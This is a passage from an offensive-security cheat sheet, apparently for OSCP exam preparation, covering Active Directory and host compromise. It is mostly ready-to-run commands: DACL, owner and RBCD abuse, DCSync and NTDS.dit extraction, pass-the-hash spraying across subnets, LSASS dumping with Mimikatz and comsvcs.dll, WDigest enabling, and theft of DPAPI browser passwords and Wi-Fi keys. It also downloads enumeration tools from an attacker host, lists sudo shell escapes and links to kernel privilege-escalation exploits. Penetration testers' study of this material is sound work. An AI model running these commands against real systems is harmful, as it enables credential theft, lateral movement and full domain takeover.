impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" \
  -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

impacket-dacledit -action backup -target "$EDGE_TARGET" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

# Pick only one locally supported minimum right after `impacket-dacledit -h`.
# Common families: WriteMembers, ResetPassword, DCSync, or justified Custom GUID.
export MINIMUM_RIGHT='WriteMembers'
impacket-dacledit -action write -rights "$MINIMUM_RIGHT" \
  -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" \
  -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

# Use the exact backup printed by this target's backup command.
export DACL_BACKUP='dacledit-YYYYMMDD-HHMMSS.bak'
impacket-dacledit -action restore -file "$DACL_BACKUP" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
```

### WriteOwner

```bash
# Record the exact reported owner as ORIGINAL_OWNER before writing.
impacket-owneredit -action read -target "$EDGE_TARGET" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

impacket-owneredit -action write -new-owner "$CONTROLLED_PRINCIPAL" \
  -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

# Ownership is only a bridge: now use the minimum WriteDacl plan above.
# Restore the DACL first, then the original owner.
impacket-owneredit -action write -new-owner "$ORIGINAL_OWNER" \
  -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
impacket-owneredit -action read -target "$EDGE_TARGET" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
```

`owneredit` has read/write actions, not an automatic restore action. If you did
not record the original owner, you do not yet have a safe plan.

### AllowedToAct / AddAllowedToAct — RBCD

```bash
# CONTROLLED_COMPUTER must be a controlled service/computer account with an SPN.
impacket-rbcd -action read -delegate-to "$EDGE_TARGET" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$CONTROLLED_COMPUTER" --attr servicePrincipalName

impacket-rbcd -action write -delegate-from "$CONTROLLED_COMPUTER" \
  -delegate-to "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"

impacket-getST -spn "cifs/$TARGET_HOST" -impersonate Administrator \
  -dc-ip "$DC_IP" "$DOMAIN/$CONTROLLED_COMPUTER:$COMPUTER_PASS"

# Use the exact ccache filename printed by getST.
export KRB5CCNAME='/absolute/path/printed-by-getST.ccache'
klist
impacket-smbclient -k -no-pass "$DOMAIN/Administrator@$TARGET_HOST"

# Remove only the delegate you added. Never use flush when other entries exist.
impacket-rbcd -action remove -delegate-from "$CONTROLLED_COMPUTER" \
  -delegate-to "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
impacket-rbcd -action read -delegate-to "$EDGE_TARGET" \
  -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
```

RBCD also requires a compatible target (Windows Server 2012+) and an
impersonated user who is not blocked by Protected Users or delegation
restrictions. The ticket SPN/FQDN must match the service you actually use.

### AdminTo / CanPSRemote / CanRDP

```bash
getent hosts "$TARGET_HOST"
nmap -Pn -n -p 135,139,445,3389,5985,5986 "$TARGET_HOST" -oA "access-$TARGET_HOST"

nxc smb "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc winrm "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc rdp "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"

# Choose ONE exposed and authorized protocol.
evil-winrm -i "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS"
impacket-wmiexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET_HOST"
impacket-psexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET_HOST"
xfreerdp3 /v:"$TARGET_HOST" /u:"$AUTH_USER" /p:"$AUTH_PASS" /d:"$DOMAIN" /cert:tofu
```

Run only the command for the exposed protocol and edge. `CanPSRemote` and
`CanRDP` do not guarantee administrator privileges. Every protocol can produce
a different token/profile; run `whoami /all`, `hostname` and `ipconfig` inside
the new session.

### ReadLAPSPassword

```bash
impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER:$AUTH_PASS" \
  -dc-ip "$DC_IP" -computer "$EDGE_TARGET"
# Consult local -h and add -ldaps only when required by the DC/environment.

export LAPS_USER='Administrator'
export LAPS_PASS='paste-exact-returned-secret'
nxc smb "$TARGET_HOST" -u "$LAPS_USER" -p "$LAPS_PASS" --local-auth
unset LAPS_PASS
```

The password belongs to the exact computer object and is a local credential.
Do not assume that it works on other hosts.

### ReadGMSAPassword

```bash
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
  get object "$EDGE_TARGET" --attr sAMAccountName,servicePrincipalName,msDS-ManagedPassword
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --gmsa

export GMSA_HASH='paste-exact-returned-ntlm'
nxc ldap "$DC_IP" -u "$EDGE_TARGET" -H "$GMSA_HASH" -d "$DOMAIN"
unset GMSA_HASH
```

Use the gMSA hash only where its SPNs or graph relationships justify access.

### DCSync

```bash
# BloodHound should show the composed DCSync edge from GetChanges + GetChangesAll.
export DCSYNC_USER='Administrator'
impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" \
  -outputfile "dcsync-$DCSYNC_USER" "$DOMAIN/$AUTH_USER:$AUTH_PASS@$DC"
ls -l "dcsync-$DCSYNC_USER"*
unset DCSYNC_USER
```

Start with one account needed by the proven next step. DCSync is read-only
against AD, but its output is highly sensitive and must be protected.

### Edge failed — diagnose in this order

1. Re-confirm source principal, destination object/type and edge freshness.
2. Prove route, DC/host FQDN, required port, DNS and domain time.
3. Separate authentication from authorization and local from domain identity.
4. Confirm exact attribute/right, schema/DC level, PKINIT/CA, SPN and delegation
   restrictions.
5. Run the installed tool's `-h` / `--help`; wrapper syntax can drift.
6. Retry the same hypothesis once after fixing the proved cause. If nothing new
   appears, record the missing prerequisite and rotate.

### Sources frozen for V19

- SpecterOps BloodHound CE edge documentation: GenericAll, GenericWrite,
  WriteDacl, WriteOwner, AddMember, ForceChangePassword,
  AddKeyCredentialLink, AllowedToAct, AdminTo, CanPSRemote, CanRDP,
  ReadLAPSPassword, ReadGMSAPassword and DCSync.
- Fortra Impacket `dacledit.py`, `owneredit.py` and `rbcd.py` current CLI.
- Certipy command/post-exploitation reference for `shadow list/auto/remove`.
- BloodyAD User Guide for `get object`, `get membership`, `add/remove
  groupMember`, RBCD and password operations.
- ShutdownRepo targetedKerberoast README for `--request-user` and automatic
  temporary-SPN removal.

The installed local help and current official OffSec exam rules always win.

</details>


<details>


<summary>🎫 9.7 AD CS --- ESC1--ESC17 Decision Tree</summary>






Modern AD CS assessment should include the full ESC1--ESC17 family
rather than stopping at ESC1/ESC8.

``` text
DISCOVER CA
   ↓
ENUMERATE TEMPLATES
   ↓
WHO CAN ENROLL?
   ↓
WHO CAN MODIFY TEMPLATE?
   ↓
SUBJECT / SAN CONTROL?
   ↓
EKU / CLIENT AUTHENTICATION?
   ↓
MANAGER APPROVAL?
   ↓
AUTHORIZED SIGNATURES?
   ↓
CERTIFICATE MAPPING?
   ↓
CA-LEVEL PERMISSIONS?
   ↓
ESC1–ESC17
```

Tool:

https://github.com/ly4k/Certipy

Key questions:

-   [ ] Who can enroll?
-   [ ] Who can modify the template?
-   [ ] Can the requester control subject/SAN?
-   [ ] Does the certificate permit authentication?
-   [ ] Is manager approval required?
-   [ ] Are authorized signatures required?
-   [ ] How is the certificate mapped to an AD principal?
-   [ ] Can the CA itself be abused?


</details>


<details>


<summary>🧩 9.8 ACL / Delegation / Machine Account Methodology</summary>






Prioritize:

``` text
GenericAll
GenericWrite
WriteDACL
WriteOwner
WriteProperty
AddMember
ForceChangePassword
msDS-KeyCredentialLink
msDS-AllowedToActOnBehalfOfOtherIdentity
SPN write
```

Delegation:

``` text
Unconstrained
Constrained
RBCD
```

For every interesting ACL:

``` text
WHO has the permission?
        ↓
ON WHICH object?
        ↓
WHAT exact attribute/action can be changed?
        ↓
WHAT privilege does that change produce?
        ↓
CAN IT BE CHAINED TO ANOTHER OBJECT?
```


</details>


<details>


<summary>💀 9.6 Domain Compromise --- Final Steps</summary>






``` bash
# ── DCSYNC (get all hashes) ───────────────────────────────────
# Requires: DCSync rights (DA, or granted via ACL)
impacket-secretsdump $DOMAIN/admin:pass@$DC
impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-ntlm   # NTLM only
impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-user Administrator
impacket-secretsdump $DOMAIN/admin:pass@$DC -outputfile loot/hashes/domain_hashes
# Mimikatz:
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv

# ── NTDS.DIT EXTRACTION ───────────────────────────────────────
# If can't DCSync but have SYSTEM on DC:
# VSS shadow copy:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Transfer files to Kali, then:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# ── PASS-THE-HASH DA ──────────────────────────────────────────
impacket-psexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
evil-winrm -i $IP -u Administrator -H NTLMHASH
nxc smb $IP -u Administrator -H NTLMHASH -x 'whoami'

# ── SPRAY DA HASH EVERYWHERE ──────────────────────────────────
nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --continue-on-success
# Local admin hash spray (built-in Administrator is same on all):
nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --local-auth

# ── DUMP LSASS (for more creds) ───────────────────────────────
# From admin shell:
# Method 1 — Mimikatz:
sekurlsa::logonpasswords
# Method 2 — Task Manager (GUI): processes → lsass.exe → Create dump file
# Method 3 — ProcDump:
procdump.exe -ma lsass.exe lsass.dmp
# Method 4 — comsvcs.dll (no extra tool):
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
# Method 5 — Pypykatz (parse on Kali):
pypykatz lsa minidump lsass.dmp
```


</details>


<details>


<summary>🔐 9.7 ACL / DACL Abuse</summary>






``` bash
# ── FIND EXPLOITABLE ACES ─────────────────────────────────────
# PowerView:
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "lowprivuser"}
# All writable ACEs for current user:
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty" -and $_.IdentityReferenceName -match "lowprivuser"}

# BloodHound shows target-type-specific edges. Export/save the exact source,
# edge and destination before leaving the graph.

# Kali-side read-only confirmation helpers:
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get writable --detail
impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
impacket-owneredit -action read -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER:$AUTH_PASS"
```

Then use **9.6B V19 BloodHound Edge Execution Desk** for the exact target
type. It includes current commands and the required pre-state, minimum-change,
verification and rollback sequence. Do not substitute `Domain Admins`, the
domain object or another high-value target for the destination actually shown
in your graph.


</details>


<details>


<summary>🏃 9.8 Lateral Movement in AD</summary>






``` bash
# ── REMOTE CODE EXECUTION (choose based on what's open) ───────
# WinRM (5985): evil-winrm
# SMB (445): psexec, smbexec, atexec
# WMI (135): wmiexec
# DCOM (135): dcomexec
# SSH (22): ssh
# RDP (3389): xfreerdp

# ── IMPACKET SUITE ────────────────────────────────────────────
impacket-psexec $DOMAIN/user:pass@$IP               # Creates service, uploads binary
impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH
impacket-wmiexec $DOMAIN/user:pass@$IP              # WMI — no service created
impacket-smbexec $DOMAIN/user:pass@$IP              # SMB — no binary on disk
impacket-atexec $DOMAIN/user:pass@$IP "whoami"      # Task scheduler
impacket-dcomexec $DOMAIN/user:pass@$IP 'cmd.exe /c whoami' -object MMC20  # DCOM

# ── nxc ──────────────────────────────────────────────
nxc smb $IP -u user -p pass -x 'whoami'           # cmd
nxc smb $IP -u user -p pass -X 'Get-Process'      # PowerShell
nxc winrm $IP -u user -p pass -x 'whoami'
nxc smb $IP -u admin -H HASH -x 'whoami'             # One justified host first

# ── EVIL-WINRM ────────────────────────────────────────────────
evil-winrm -i $IP -u user -p pass
# Upload tool:
upload /tmp/winPEAS.exe
# Proof must be read in place in the interactive target shell:
ipconfig
type C:\Users\Administrator\Desktop\proof.txt

# Do not enable WinRM merely to make a preferred client work. Use an already
# exposed service, or document the exact state change and rollback first.
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
```


</details>


------------------------------------------------------------------------

<details>
<summary>🎯 9.x STANDALONE FAST PATH — Foothold → Root Without Wandering</summary>

### Foothold triage

```text
ALL TCP PORTS
   ↓
SERVICE VERSION + HOSTNAME/VHOST
   ↓
ANONYMOUS / DEFAULT CREDS / FOUND CREDS
   ↓
WEB SOURCE + ROBOTS + BACKUPS + CONFIG + .git
   ↓
MANUAL WEB TESTING
   ↓
EXACT PRODUCT/BUILD + CVE PREREQUISITES
   ↓
FOOTHOLD
```

When multiple paths exist, rank them:

```text
1. Credentials / exposed secrets
2. Obvious writable/upload/file-read/command primitives
3. Known exact-version exploit with matching prerequisites
4. Complex or unstable exploit chain
```

### First 5 minutes after a Linux shell

```bash
id
sudo -l
ss -lntup
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Then immediately start `pspy`/LinPEAS in parallel while manually checking cron/systemd, credentials, writable services/scripts and internal listeners.

### First 5 minutes after a Windows shell

```cmd
whoami /all
whoami /priv
netstat -ano
schtasks /query /fo LIST /v
sc query
```

Then run PrivescCheck/WinPEAS/Seatbelt as appropriate and **read the output carefully**. Recent 2026 pass feedback repeatedly highlights lost time caused by running tools but overlooking their results.

### "Kitchen sink" does NOT mean random

Automated enumeration is useful only after you have a baseline. Keep a short shortlist:

```text
HIGH CONFIDENCE
MEDIUM CONFIDENCE
LOW CONFIDENCE / PARKED
```

Work high-confidence paths first.

</details>


## 10. POST-EXPLOITATION --- LINUX


<details>


<summary>👁️ 10.1 Full Situational Awareness</summary>






``` bash
# get python interactive shell =>
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo ; fg

#if above doesn't work =>
1. On target (reverse shell):
python3 -c 'import pty;pty.spawn("/bin/bash")'
2. Press: Ctrl + Z
3. On your attacker machine terminal:
stty raw -echo
4. Bring shell back:
fg
5. Press Enter
6. Fix terminal:
export TERM=xterm

# ── RUN THIS ENTIRE BLOCK IMMEDIATELY AFTER GETTING SHELL ─────
id; whoami; hostname; cat /etc/os-release; uname -a
ip a; ip route; cat /etc/hosts; arp -a
ss -tulnp 2>/dev/null || netstat -antup 2>/dev/null
cat /etc/passwd | grep -v nologin | grep -v false
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt
crontab -l 2>/dev/null; cat /etc/cron* 2>/dev/null
ps aux | head -30
env

# ── INTERNAL SERVICES (ports not visible from outside!) ───────
ss -tulnp    # What's only listening on localhost?
# Common finds:
# 127.0.0.1:3306 → MySQL
# 127.0.0.1:6379 → Redis
# 127.0.0.1:8080 → Internal web app
# Port forward to reach:
ssh -L 8080:127.0.0.1:8080 user@$IP    # From attacker

# ── FILESYSTEM SEARCH ─────────────────────────────────────────
# Sensitive file types:
find / -name "*.conf" -readable 2>/dev/null | grep -v proc
find / -name "*.cfg" -readable 2>/dev/null | grep -v proc
find / -name "*.ini" -readable 2>/dev/null | grep -v proc
find / -name "*.sh" -readable 2>/dev/null | grep -v proc
find / -name "*.py" -readable 2>/dev/null | grep -v proc
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# World-writable files/dirs:
find / -writable -type d 2>/dev/null | grep -v proc
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Recently modified:
find / -newer /tmp -type f 2>/dev/null | grep -v proc | grep -v sys | head -30

# Interesting dirs:
ls -la /opt/ /srv/ /var/backups/ /var/www/ /var/mail/ /tmp/ /dev/shm/

# ── CAPABILITIES CHECK ────────────────────────────────────────
getcap -r / 2>/dev/null

# ── SENSITIVE FILE CONTENT ────────────────────────────────────
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat ~/.local/share/recently-used.xbel 2>/dev/null   # GUI recent files
cat ~/.config/*/config 2>/dev/null
find /home -name ".bash_history" 2>/dev/null | xargs cat
find /root -name ".bash_history" 2>/dev/null | xargs cat
```


</details>


<details>


<summary>🔍 10.2 Linux Internal Enumeration --- Advanced</summary>






``` bash
# ── PROCESS MONITORING (key for cron exploitation) ────────────
# pspy — monitor processes without root:
./pspy64 | tee /tmp/pspy.log &
# Watch for 5-10 minutes for cron jobs
# Look for: root running scripts, interesting arguments with passwords

# ── NETWORK PIVOTING ──────────────────────────────────────────
# What other machines can THIS box reach?
for i in $(seq 1 254); do (ping -c1 192.168.x.$i >/dev/null && echo "192.168.x.$i") & done
# Port scan internal hosts:
for port in 22 80 443 445 3389 8080; do
  for host in 192.168.x.{1..254}; do
    (nc -zv -w1 $host $port 2>&1 | grep -v "refused") &
  done
done

# ── DOCKER/CONTAINER CHECK ────────────────────────────────────
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv 2>/dev/null
env | grep -i kube
# If in container — look for:
# - Mounted secrets
# - Kubernetes service account tokens
# - Docker socket
ls /var/run/docker.sock 2>/dev/null
cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# ── MYSQL/DB CREDENTIALS FROM APP ─────────────────────────────
# WordPress:
find / -name "wp-config.php" 2>/dev/null | xargs grep -E "DB_(NAME|USER|PASSWORD|HOST)"
# Django:
find / -name "settings.py" 2>/dev/null | xargs grep -E "DATABASES|PASSWORD" 2>/dev/null
# Laravel:
find / -name ".env" 2>/dev/null | xargs cat

# Then access the DB directly for more creds:
mysql -u root -p$(grep DB_PASSWORD .env | cut -d= -f2) -e "show databases; use app; select * from users;"
```


</details>


------------------------------------------------------------------------

## 11. POST-EXPLOITATION --- WINDOWS


<details>


<summary>👁️ 11.1 Full Windows Situational Awareness</summary>






``` cmd
REM ── RUN IMMEDIATELY AFTER SHELL ──────────────────────────────
whoami /all
hostname
ipconfig /all
netstat -ano
net users
net localgroup administrators
systeminfo
wmic os get caption,version
wmic computersystem get domain
wmic product get name,version
tasklist /svc
schtasks /query /fo LIST /v
netsh firewall show state
cmdkey /list
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
dir C:\Users\
dir C:\Users\user\Desktop
dir C:\Users\user\Documents
dir C:\Users\user\Downloads
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\
```


</details>


<details>


<summary>📦 11.2 Windows Credential Extraction</summary>






``` powershell
# ── MIMIKATZ (most powerful) ──────────────────────────────────
.\mimikatz.exe
privilege::debug                           # Must succeed (need SYSTEM/admin)
token::elevate                             # Elevate to SYSTEM token
sekurlsa::logonpasswords                   # All logged-in user creds (cleartext if possible)
sekurlsa::wdigest                          # WDigest (cleartext on older systems)
sekurlsa::kerberos                         # Kerberos tickets
sekurlsa::credman                          # Credential Manager
lsadump::sam                               # SAM hashes (local accounts)
lsadump::secrets                           # LSA secrets
lsadump::cache                             # Cached domain credentials
lsadump::dcsync /domain:domain.com /all    # DCSync (if DA)

# Mimikatz one-liner:
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# ── DUMP LSASS WITHOUT MIMIKATZ ───────────────────────────────
# Via comsvcs.dll (built-in, less detected):
$id = (Get-Process -Name lsass).Id
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $id C:\Users\Public\lsass.dmp full
# Transfer lsass.dmp to Kali, analyze:
pypykatz lsa minidump lsass.dmp
# Or: impacket-secretsdump -sam lsass.dmp LOCAL (for SAM format)

# Via ProcDump (sysinternals):
.\procdump.exe -ma lsass.exe lsass.dmp -accepteula

# ── ENABLE WDIGEST (cleartext passwords after re-login) ────────
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# Wait for user to log in again → then dump

# ── CREDENTIAL MANAGER ────────────────────────────────────────
cmdkey /list
# If RDP creds listed:
runas /savedcredentials /user:DOMAIN\user "cmd.exe /c whoami > C:\Users\Public\out.txt"
# Mimikatz:
vault::cred
vault::list

# ── SAM WITHOUT SYSTEM PRIVILEGE ──────────────────────────────
# Volume Shadow Copy trick (if backup rights):
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
# Then copy from shadow:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# ── DPAPI (encrypted user secrets) ────────────────────────────
# Browser passwords, certificates, etc.
# Mimikatz:
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
sekurlsa::dpapi

# ── WIRELESS PASSWORDS ────────────────────────────────────────
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear    # cleartext key!
```


</details>


------------------------------------------------------------------------

## 12. PRIVILEGE ESCALATION --- LINUX (EVERY VECTOR)


<details>


<summary>🧨 12.1 Copy Fail --- CVE-2026-31431</summary>





-   Theori PoC: https://github.com/theori-io/copy-fail-CVE-2026-31431
-   Alternate Python PoC:
    https://github.com/danielino/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py

Linux kernel local privilege escalation research/PoCs. Verify the exact
kernel/distro build and prerequisites.


</details>


<details>


<summary>🧨 12.2 pkexec / PwnKit --- CVE-2021-4034</summary>





Reference: https://github.com/ly4k/PwnKit

``` bash
which pkexec
pkexec --version 2>/dev/null
dpkg -l policykit-1 2>/dev/null
rpm -q polkit 2>/dev/null
```

Verify distro patch/backport status before assuming vulnerability.


</details>


<details>


<summary>🧨 12.3 GhostLock --- SMB Availability Research</summary>





Reference: https://github.com/kimd155/ghostlock

**Classification note:** GhostLock is not a Linux LPE CVE; it is SMB
availability research. Preserved here as requested.


</details>


<details>


<summary>🧨 12.4 DirtyFrag</summary>





Reference: https://github.com/V4bel/dirtyfrag

Preserved as a Linux kernel privilege-escalation research reference.
Validate affected kernels and prerequisites.


</details>


<details>


<summary>🧨 12.5 DirtyClone --- CVE-2026-43503</summary>





Reference: https://github.com/entra1337/DirtyClone

Python PoC for Linux kernel LPE via page-cache corruption. Verify exact
affected kernel/build and prerequisites.


</details>


<details>


<summary>🧨 12.6 Bad-epoll</summary>





Reference: https://github.com/J-jaeyoung/bad-epoll

Preserved as a kernel exploitation research reference. Confirm affected
versions and prerequisites.


</details>


<details>


<summary>🧨 12.7 Fragnesia</summary>





Reference:
https://github.com/v12-security/pocs/blob/main/fragnesia%2FREADME.md

Validate affected kernel versions, configuration and prerequisites.


</details>


<details>


<summary>🧨 12.8 OVSwrap --- CVE-2026-64531</summary>





Reference: https://github.com/HackSpeak/CVE-2026-64531

Linux kernel Open vSwitch LPE research PoC. Verify the required Open
vSwitch/kernel functionality is present.


</details>


<details>


<summary>🧨 12.9 Pack2TheRoot --- CVE-2026-41651</summary>





Reference: https://github.com/shibaaa204/Pack2TheRoot.git

PackageKit LPE PoC. Verify the exact PackageKit version/configuration.


</details>


<details>


<summary>🧨 12.10 sudo wget Privilege Escalation</summary>





Reference:
https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation

``` bash
sudo -l
```

Determine what file/network operations the allowed `wget` invocation
permits in the specific sudoers configuration.


</details>

> **Method:** enumerate → validate ownership/permissions → identify
> execution path → check prerequisites → exploit → re-enumerate.


<details>


<summary>🧭 12.11 Linux PrivEsc Situational Awareness --- ALWAYS START HERE</summary>






``` bash
id
whoami
groups
hostname
uname -a
uname -r
cat /etc/os-release
cat /proc/version
cat /proc/cmdline
cat /proc/1/cgroup
systemd-detect-virt 2>/dev/null

ip addr
ip route
cat /etc/hosts
cat /etc/resolv.conf
ss -lntup
ps auxww
mount
findmnt
lsblk
```

Check:

-   [ ] Physical host / VM / Docker / LXC / LXD
-   [ ] Exact distro + package revision
-   [ ] Kernel + architecture
-   [ ] AppArmor / SELinux
-   [ ] Root-owned services/scripts
-   [ ] Internal listeners/routes
-   [ ] Mounted NFS/CIFS shares
-   [ ] Secrets in environment/process arguments
-   [ ] Cron + systemd timers
-   [ ] SUID/SGID + capabilities

``` bash
aa-status 2>/dev/null
getenforce 2>/dev/null
sestatus 2>/dev/null
env | sort
systemctl list-units --type=service --state=running
systemctl list-timers --all
```


</details>


<details>


<summary>🤖 12.12 Automated Enumeration --- Run, Then Manually Validate</summary>






``` bash
# LinPEAS
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.txt

# Linux Smart Enumeration
wget http://$LHOST/lse.sh -O /tmp/lse.sh
chmod +x /tmp/lse.sh
/tmp/lse.sh -l 2 | tee /tmp/lse.txt

# pspy — essential for observing root jobs
wget http://$LHOST/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy | tee /tmp/pspy.log

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# unix-privesc-check
./unix-privesc-check standard
```

**Rule:** a red LinPEAS finding is a lead, not proof. Verify the actual
file owner, ACL, process, version, configuration and execution context.


</details>


<details>


<summary>🔐 12.13 Sudo --- Configuration, Escapes & CVEs</summary>






``` bash
sudo -l
sudo -V
sudo -ll
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d 2>/dev/null
```

Check:

-   [ ] `NOPASSWD`
-   [ ] Wildcards
-   [ ] Dangerous interpreters
-   [ ] User-controlled arguments
-   [ ] `SETENV`
-   [ ] `env_keep`
-   [ ] `LD_PRELOAD`
-   [ ] `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`
-   [ ] Writable scripts/configs invoked by allowed commands

GTFOBins: https://gtfobins.github.io/

Common sudo escape checks when the exact sudo rule permits them:

``` bash
sudo find . -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### Sudo CVE references

-   **CVE-2021-3156 --- Baron Samedit:** verify exact sudo
    version/package patch level.
-   **CVE-2019-14287:** only relevant to specific sudoers configurations
    and affected versions.

Do not use upstream version strings alone; distro backports matter.


</details>


<details>


<summary>🔴 12.14 SUID / SGID Binaries</summary>






``` bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm /6000 -type f 2>/dev/null
```

For every unusual/custom binary:

``` bash
ls -la /path/to/binary
file /path/to/binary
strings /path/to/binary
ldd /path/to/binary
readelf -d /path/to/binary
strace -f -e trace=execve,openat /path/to/binary 2>&1
ltrace /path/to/binary 2>&1
```

Ask:

``` text
Does it execute another program without an absolute path?
Does it load a writable library?
Does it read a writable config?
Does it follow attacker-controlled symlinks?
Does it use predictable temporary files?
Does it parse attacker-controlled input?
```

Reference: https://gtfobins.github.io/


</details>


<details>


<summary>✏️ 12.15 Writable Files, Directories & Ownership</summary>






``` bash
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
find /etc /opt /usr/local /var/www /var/backups -writable -ls 2>/dev/null
```

Prioritize:

``` text
/etc/passwd
/etc/shadow
/etc/sudoers
/etc/sudoers.d/*
/etc/cron*
/etc/systemd/*
/etc/init.d/*
/opt/*
/usr/local/*
/var/www/*
root-owned scripts
root-owned configuration
service EnvironmentFile
```

### File ownership decision tree

``` text
ROOT EXECUTES FILE
       |
       +-- Can I modify the file?
       |       +-- YES → direct execution path
       |
       +-- Can I modify its parent directory?
       |       +-- YES → replacement/symlink/path attack
       |
